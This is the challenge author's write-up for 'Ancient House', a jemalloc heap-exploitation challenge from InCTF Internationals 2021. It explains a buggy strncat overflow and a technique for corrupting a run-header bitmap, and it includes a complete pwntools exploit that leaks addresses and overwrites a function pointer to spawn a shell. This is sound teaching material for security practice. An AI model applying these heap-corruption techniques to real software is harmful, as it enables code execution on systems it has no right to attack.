---
title: Ancient House - InCTF Internationals 2021
date: 2021-08-15 20:05:10
author: Pwn-Solo
author_url: https://twitter.com/Pwn_Solo
categories:
  - Pwn
tags:
  - Exploitation
  - Linux
  - Jemalloc
  - Heap
  - InCTFi
---

Jemalloc heap challenge
A buggy implementation of `strncat` in `merge` allows for an overwrite onto the next region 

**Challenge Points:** 540
**No of Solves:** 31
**Challenge Author:** [Pwn-Solo](https://twitter.com/Pwn_Solo)


A beginner friendly pwn challenge I made for InCTFi 2021 as an introduction to  jemalloc exploitation. A really helpful [Article](http://phrack.org/issues/68/10.html) I found for jemalloc exploitation and internals 


## Jemalloc 101 
Some terms that will help in understanding the writeup better 
* **Chunks** - A chunk is used to describe big virtual memory
regions that the memory allocator conceptually divides available memory
into.
* **Arenas** - Arenas are the central jemalloc data structures as they are used to manage the chunks
*  **Runs** - Runs are further memory denominations of the memory divided by jemalloc into chunks , Runs are page aligned and are primarily used to track end-user allocations(regions).
Runs are divided into multiple size classes and hold regions of that particular size. 
* **Regions** - end user allocations, returned by `malloc()`(equivalent to chunks in Glibc). for small and medium sizes, the user allocations are contiguous. Unlike glibc the chunks dont have metadata, the state(allocated or free) of the regions are tracked by the run's metadata


## Bug
* The `merge` option essentialy lets you merge two regions if they are of the same size. The way this works is, it `realloc`'s the first chunk to `size+size2` and then concats the data from the second region over to the realloced region

```c
char * buggy_strncat(char * dest, const char * src, size_t n){
    size_t dest_len = strlen(dest);
    size_t i;

    for (i =0 ; i< n ; i++)
        dest[dest_len + i] = src[i];
    dest[dest_len + i] = '\x00';

    return dest;
}

int merge(int id1, int id2){
    
    int sz1 = players[id1]->size;
    int sz2 = players[id2]->size;

    if (id1 == id2 || sz1 != sz2 || sz1+sz2 >=0x60){
        printf("Dont try anything funny \n");
        exit(1);
    }
    players[id1]->name = realloc(players[id1]->name,sz1+sz2);
    players[id1]->size = sz1+sz2;
    players[id1]->hp = players[id1]->hp + players[id2]->hp;
    
    buggy_strncat(players[id1]->name,players[id2]->name,sz1+sz2);
    free(players[id2]->name);
    free(players[id2]);

    players[id2] = NULL;

    return 0;
}
```
The bug here is pretty clear, `strlen()` can be tricked to return a value greater than the region size by allocating 2 regions and filling them end to end. This can then be leveraged to achieve an overflow when the merged region is created after the `realloc()`

## Exploitation

To make the exploitation easy ,the 0x50 run contains a region holding a function ptr which is called during the exit option. There's also `system@plt` provided to further aid in exploitation.

There are actually a couple of ways in which you can go about exploiting this, one of which is to overwrite the name ptr of the enemy region to effectively gain an arbitrary free.This can be used to free the region holding the function ptr which we can then populate with `system` by adding another chunk . This was how most teams solved it 

but ... we're not here to talk about that

There's another way , one which I find way more fun . The idea here is to corrupt the run header metadata to trick malloc into returning back an allocated chunk.

let's take a look at the 0x50 run header (the run having our target funcion ptr)
```shell
0x7ffff7008000: 0x00000000384adf93      0x00007ffff7800d70
0x7ffff7008010: 0x0000002e00000004      0x0003fffffffffff0
0x7ffff7008020: 0x0000000000000000      0x0000000000000000
0x7ffff7008030: 0x0000000000000000      0x0000000000000000
```
Struct members of the run header 
```shell
gef➤  p *(arena_run_t*)0x7ffff7008000
$2 = {
  magic = 0x384adf93,
  bin = 0x7ffff7800d70,
  nextind = 0x4,
  nfree = 0x2ea
}
```
The magic field exists only for DEBUG builds of jemalloc but will cause a segfault if corrupted 

The `0x0003fffffffffff0` is the bitmask of the 0x50 run, this bitmask is what tracks free and used regions. unlike Glibc , jemalloc does not use linked lists to track allocations. So, as an attacker ,overwriting this bitmask can get us control of the allocations in this particular run.

So, how do we set the bits ?
The state of each region is tracked by setting the bits according to a simple rule `0: in use , 1: free` 

since our target is right at the top and we have only 1 in use region, the last bit would be set to 0. But, since we need to get our new allocation to overlap with the previous one , we set the last bit back to 1 to essentialy fool jemalloc into thinking the run in unallocated.


## Exploit 

`Battle` option does not check for negative indices, which lets us leak a bss pointer and at the same time overwrite the maximum number of allocations.

Now that there are plenty of allocations to play around with. We fill the 0x40 run ,which lies right before the 0x50 run, and trigger the overflow at the last allocation of the 0x40 run 

```python
from pwn import *
import sys
import os

remote_ip,port = 'localhost','6969'
binary = './Ancienthouse'
brkpts = '''

'''
#context.terminal = ['tmux','splitw','-h']
if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)

else:
    io = process(binary, env={"LD_PRELOAD":"./libjemalloc.so"})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def add(name,size):
    sla(">> ",str(1))
    sla("size : ",str(size))
    sla("name : ",name)

def battle(idx):
    sla(">> ",str(2))
    sla("id : ",str(idx))

def merge(idx1,idx2):
    sla(">> ",str(3))
    sla("id 1: ",str(idx1))
    sla("id 2: ",str(idx2))

if __name__ == "__main__":

    sl(b"/bin/sh")

    add("a"*0x20,0x40)
    add("b"*0x20,0x40)

    for i in range(7):
        battle(1)
    sla(">>","1")
    
    for i in range(7):
        battle(0)
    sla(">>","1")

    add("c",0x20)
    
    battle(2)

    ru("battle with ")
    leak = u64(re(6).ljust(8,b"\x00")) ^ 0xa63
    log.info("heap base : "+ hex(leak))

    battle(-7)     

    ru("battle with ")
    code = u64(re(6).ljust(8,b"\x00"))-8
    log.info("code leak : "+ hex(code) )
       
    sla(">>","2")
    
    for i in range(61):
        add("zz",0x40)
    add("z"*0x40,0x40)
    gdb.attach(io,brkpts)
    
    for i in range(7):
        battle(64)
    sla(">>","1")

    system = code - 0x2e90 
    fake_header =  p32(0x0) + p64(leak+0x800d70) + p64(0x0000003100000001) + p64(0x0003ffffffffffff)

    add("x"*0x20,0x20)
    add(fake_header,0x20)
    merge(65,66)

    add(p64(system) + p64(leak+0x7040), 0x50)

    io.interactive()
```

I had a lot of fun making this challenge , hope you guys did too.
